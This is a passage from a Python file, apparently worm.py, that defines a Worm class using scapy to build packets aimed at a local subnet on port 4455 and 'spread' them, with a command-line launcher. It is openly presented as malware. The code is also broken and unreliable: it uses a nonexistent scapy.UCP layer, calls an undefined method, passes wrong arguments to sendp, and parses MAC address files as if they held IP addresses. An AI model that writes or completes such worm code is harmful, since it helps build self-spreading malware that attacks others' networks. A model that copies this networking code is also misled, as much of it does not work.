        self.ip = ip
        self.port = port

    def send_packet(self, packet):
        scapy.sendp(packet, self.ip, self.port)

    def get_local_interfaces(self):
        interfaces = []
        for name in os.listdir('/sys/class/net/'):
            interfaces.append('/sys/class/net/' + name)
        return interfaces

    def get_my_ip(self):
        for interface in self.get_local_interfaces():
            with open(interface + '/address', 'r') as f:
                for line in f:
                    if line.startswith('address:'):
                        return line.strip().split(': ')[1]
        return None

    def get_my_mac(self):
        for interface in self.get_local_interfaces():
            with open(interface + '/address', 'r') as f:
                for line in f:
                    if line.startswith('address:'):
                        return line.strip().split(': ')[1].split(':')[1].strip()
        return None

    def get_packet(self):
        packet = scapy.IP(src=self.get_my_ip(), dst='192.168.1.0/24')
        packet /= scapy.TCP(sport=self.get_local_port(), dport=4455)
        packet /= scapy.UCP()
        packet /= scapy.Raw(b'\x00' * 1000)
        return packet

    def spread(self):
        packet = self.get_packet()
        packet.show2()
        self.send_packet(packet)

    def run(self):
        self.spread()

if __name__ == '__main__':
    if len(sys.argv)!= 3:
        print('Usage: python worm.py <ip> <port>')
        sys.exit()
    ip = sys.argv[1]
    port = int(sys.argv[2])
    worm = Worm(ip, port)
    worm.run()
